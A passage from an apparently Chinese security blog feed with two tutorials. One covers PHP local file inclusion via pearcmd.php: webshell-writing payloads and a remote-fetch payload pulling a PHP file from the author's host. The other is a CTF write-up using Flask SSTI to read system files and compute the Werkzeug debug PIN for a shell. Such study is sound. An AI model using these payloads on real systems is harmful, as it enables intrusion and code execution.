class="variable">$PHP</span> -C -q <span class="variable">$INCARG</span> -d date.timezone=UTC -d output_buffering=<span class="number">1</span> -d variables_order=EGPCS -d open_basedir=<span class="string">&quot;&quot;</span> -d safe_mode=<span class="number">0</span> -d register_argc_argv=<span class="string">&quot;On&quot;</span> -d auto_prepend_file=<span class="string">&quot;&quot;</span> -d auto_append_file=<span class="string">&quot;&quot;</span> <span class="variable">$INCDIR</span>/pearcmd.php <span class="string">&quot;$@&quot;</span></span><br></pre></td></tr></table></figure><p>这种sh程序我是看不太懂，大概就是最后一行在执行pear命令的时候会调用pearcmd.php文件。我们再看pearcmd.php的源码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$argv</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$HTTP_SERVER_VARS</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ERROR: either use the CLI php executable, &#x27;</span> .</span><br><span class="line">         <span class="string">&#x27;or set register_argc_argv=On in php.ini&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$argv</span> = <span class="title class_">Console_Getopt</span>::<span class="title function_ invoke__">readPHPArgv</span>();</span><br><span class="line"><span class="comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">php_sapi_name</span>() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) &amp;&amp; <span class="variable">$argv</span>[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$argv</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$argv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以看到$argv是由readPHPArgv函数赋值，那么我们就继续跟进这个函数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> PEAR::<span class="title function_ invoke__">raiseError</span>(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看$argv是否存在（这个变量储存在命令行模式下运行php脚本时传入的参数），如果不存在，就判断$_SERVER[‘argv’]这个变量，这个是我们可控的，那么这个函数返回值我们就可控。具体代码实现不需要知道，只要明白在文件包含的情况下，我们可以通过运用pear命令行工具并且控制其参数来为我们所用。</p><h3 id="利用1（不出网）"><a href="#利用1（不出网）" class="headerlink" title="利用1（不出网）"></a>利用1（不出网）</h3><p>我们可以通过pear来漏洞利用，先看看pear中能够利用的命令。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/61.png" class><p>我们要利用的就是这个config-create命令，这个命令的主要作用就是将内容写入文件中，传入两个参数，第一个参数是要写的内容，第二个参数就是要写入文件的路径，很明显，这两个参数都是可控的，自然我们应该能想到可以写入一句话进去，然后进行包含getshell。</p><p>那么我们我们可以用pear来演示一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear config-create /XiLitter /tmp/teat.txt</span><br></pre></td></tr></table></figure><p>再看一下有没有被写入临时目录。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/62.png" class><p>成功写进去了，那么就docker搭建环境来演示一下。</p><p>写入<a href="https://so.csdn.net/so/search?q=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">一句话木马</a>的payload为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure><p>注意，我们正常抓包的时候&lt;&gt;和单引号会被url编码。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/63.png" class><p>像这样，这样写进去是完全不行的，没有了php语法边界，写入的一句话木马就不会被当做php代码来执行，只能被当做文本存储，所以我们要修改掉。这个坑我踩了好久。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/64.png" class><p>后台临时目录里已经写入了test.php。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/65.png" class><p>然后包含它， 就可以进行RCE了。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/66.png" class><p>看到test.php里的内容，&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;<?=@eval($_POST['cmd']);?>&#x2F;pear&#x2F;php一块被写进去了，但是get参数file被正常解析了，也就是说我们成功包含了pearcmd.php才成功使用命令。</p><h3 id="为什么payload前面要有-号"><a href="#为什么payload前面要有-号" class="headerlink" title="为什么payload前面要有+号"></a>为什么<a href="https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020">payload</a>前面要有+号</h3><p>前面不填加号是不行的。看个例子。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/67.png" class><p>第一个元素变成了空串。在这里应该能猜到第一个元素是不起作用的。 光猜也不行，继续看pearcmd.php的代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$argv</span> = <span class="title class_">Console_Getopt</span>::<span class="title function_ invoke__">readPHPArgv</span>();</span><br><span class="line"><span class="comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">php_sapi_name</span>() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) &amp;&amp; <span class="variable">$argv</span>[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$argv</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$argv</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$progname</span> = PEAR_RUNTYPE;</span><br><span class="line"><span class="title function_ invoke__">array_shift</span>(<span class="variable">$argv</span>);</span><br><span class="line"><span class="variable">$options</span> = <span class="title class_">Console_Getopt</span>::<span class="title function_ invoke__">getopt2</span>(<span class="variable">$argv</span>, <span class="string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (PEAR::<span class="title function_ invoke__">isError</span>(<span class="variable">$options</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">usage</span>(<span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看来这个array_shift函数就是罪魁祸首了。我们通过url传入的argv数组会剔除掉第一个元素，也就是第一个元素失效，用+来代替了。</p><h3 id="利用2（出网）"><a href="#利用2（出网）" class="headerlink" title="利用2（出网）"></a>利用2（出网）</h3><p>我们可以在自己的vps上写一个php文件，通过pear下载到靶机的临时目录里，然后对该文件进行包含。这很好理解。我们写一个phpinfo()</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/68.png" class><p>使用的payload为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://xilitter.top/123.php</span><br></pre></td></tr></table></figure><p>查看后台123.php被写进去了。</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/69.png" class><p>那么进行包含，</p><img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/70.png" class><p>那么这种情况下我们就可以在vps上写马，然后通过pear下载包含，进而getshell，具体步骤就不再演示。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这个姿势在任何php版本下都能用。只要是满足前面提到的几个条件，（可以通过phpinfo查看信息）换言之，用docker开启的php环境，上面那些配置都是默认开启的，只要具有文件包含点，这种有趣的姿势就能派上用场。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p><a href="https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/#more">关于利用pearcmd进行文件包含的一些总结 | W4rsp1t3’s blog</a></p><p><a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">Docker PHP裸文件本地包含综述 - 跳跳糖</a></p><p><a href="https://blog.csdn.net/Mrs_H/article/details/122386511">利用pearcmd.php本地文件包含（LFI）_入山梵行的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> php安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探flask debug生成pin码</title>
      <link href="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/"/>
      <url>/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>当python的web应用没有关闭debug模式，相当于给攻击者留下后门，比如说通过报错信息返回部分源码可供代码审计，有时也会返回当前py文件的绝对路径，另外，如果我们进入到debug调试页面，就可以拿到python的交互式shell，执行任意代码。（下文例子有充分体验）然而我们要进入调试页面，需要输入pin码。<br>什么是pin码</p><p>pin是Werkzeug提供的安全措施，另外加的一层保障，不知道pin码是无法进入调试器的。（Werkzeug简单来说就是一个工具包,flask框架就是Werkzeug为底层库开发的）pin码是满足一定的生成算法，所以才有研究的必要，无论重复启动多少次程序，生成的pin码是不变的，但是Werkzeug和python版本的不同会影响pin码的生成。<br>探究pin码的生成方法</p><p>由于自身python代码审计能力欠缺，本文侧重点不在于探究Pin码生成算法的底层原理，而是在面对求pin码的ctf题目中能够有思路解决。</p><p>开启一个简单的flask程序。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello!&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>开启成功后在run.app下断点，进行调试。点击步入，进入app.py。</p><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/45.png" class><p>因为pin码是Werkzeug添加的安全措施，所以在源码中找到导入了Werkzeug的部分。全局搜索，发现在Werkzeug中调用了run_simple。</p><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/46.png" class><p>我们ctrl加点击进入这个函数里，然后进入到了seving.py文件中，找到有关创建debug的部分，这里在debug中又导入了DebuggedApplication。</p><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/47.png" class><p>继续跟进，来到了__init__.py。找到pin函数。</p><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/48.png" class><p>进入get_pin_and_cookie_name函数。就来到了pin码生成的具体实现方法。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params"></span></span><br><span class="line"><span class="params">    app: <span class="string">&quot;WSGIApplication&quot;</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Union</span>[t.<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>], t.<span class="type">Tuple</span>[<span class="literal">None</span>, <span class="literal">None</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Pin was explicitly disabled</span></span><br><span class="line"><span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Pin was provided explicitly</span></span><br><span class="line"><span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdigit():</span><br><span class="line">    <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> pin:</span><br><span class="line">        rv = pin</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        num = pin</span><br><span class="line"> </span><br><span class="line">modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">username: t.<span class="type">Optional</span>[<span class="built_in">str</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">    <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">    <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">    username = getpass.getuser()</span><br><span class="line"><span class="keyword">except</span> (ImportError, KeyError):</span><br><span class="line">    username = <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">mod = sys.modules.get(modname)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line"><span class="comment"># computer, not as a security feature.</span></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username,</span><br><span class="line">    modname,</span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">    <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line"><span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line"><span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line"> </span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"> </span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure><p>这个返回的rv就是pin码，我们不需要去看懂这些代码，这个函数的关键就是将列表的值进行hash，所以我们只需要将列表中的值添加，然后运行即可得出pin码。</p><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/49.png" class><p>那么想要生成pin码就需要以下几种要素：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:通过getpass.getuser()读取，通过文件读取/etc/passwd</span><br><span class="line">modname:默认就是flask.app,通过getattr(mod,“file”,None)读取</span><br><span class="line">appname:默认Flask,通过getattr(app,“name”,type(app).name)读取</span><br><span class="line">moddir:当前网络mac地址，通过/sys/class/net/eth0/address读取</span><br><span class="line">uuidnode:</span><br><span class="line">machine_id:由三个合并(docker环境为后两个):1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br></pre></td></tr></table></figure><p>获取以上的信息添加到列表中，运行一遍函数，即可得到pin码，接下来通过buu的一道题目深切体会一遍。</p><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>打开题目是一个base64加密解密的网站，在解密功能中输入错误信息发生报错。同时若开启命令行需要pin码。</p><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/50.png" class><p>在本题只谈论预期解（求pin码）。同时在解密功能上也有ssti漏洞，比如4，页面返回为4。</p><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/51.png" class><p>但是常规的ssti执行命令在这题是不可取的，有waf。但是可以读取系统文件，比如&#x2F;etc&#x2F;passwd，那么payload为：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;a.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后base64编码，点击提交：</p><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/52.png" class><p>那么就通过ssti漏洞读取生成pin码所需要的几种要素。</p><p>username:通过读取到了&#x2F;etc&#x2F;passwd，不难发现用户名就为flaskweb。</p><p>app.py的绝对路径:可以通过报错信息获得，绝对路径为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py。</p><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/53.png" class><p>当前机器的mac地址:通过读取&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address来获取mac的十六进制。payload为</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;a.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到的十六进制为42:b6:25:62:b6:ac，可以通过这行python代码转十进制：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(int(&#x27;42b62562b6ac&#x27;,16))</span><br></pre></td></tr></table></figure><p>转换十进制为73350078707372。</p><p>机器id:buu题目应该是docker搭建的。读取&#x2F;proc&#x2F;self&#x2F;cgroup。payload为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;a.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc/self/cgroup&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>而机器id就是&#x2F;docker&#x2F;后面的一串。但是本题并不是这样，试了好久，并不能获得真正的机器id</p><p>而是要读取&#x2F;etc&#x2F;machine-id，所以真正的payload为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;a.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/machine-id&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/54.png" class><p>所以机器id就是1408f836b0ca514d796cbf8960e45fa1</p><p>以上生成pin的关键要素已经收集完毕。把上面get_pin_and_cookie_name函数实现方法修改一下列表值，最后添加print函数将pin码打印出来。所以脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"> </span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;253462484137374&#x27;</span>,  <span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>  <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>运行得到pin码为150-047-229。输入pin码成功登录。可执行shell，</p><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/55.png" class><p>那么开始读取flag。用os.system貌似不行，用os.popen函数读取。</p><img src="/2023/01/31/%E5%88%9D%E6%8E%A2flask-debug%E7%94%9F%E6%88%90pin%E7%A0%81/56.png" class><p>成功得到flag。</p><p>至此我们对获取pin码和通过pin码拿到shell有了初步的认识，今后遇到相关题目继续总结。</p><p>相关链接：</p><p><a href="https://blog.csdn.net/qq_38154820/article/details/126113468">https://blog.csdn.net/qq_38154820/article/details/126113468</a></p><p>[<a href="https://blog.csdn.net/weixin_45577185/article/details/120862099">GYCTF2020]FlaskApp 1(SSTI，PIN）_满月*的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> python安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pin码 </tag>
            
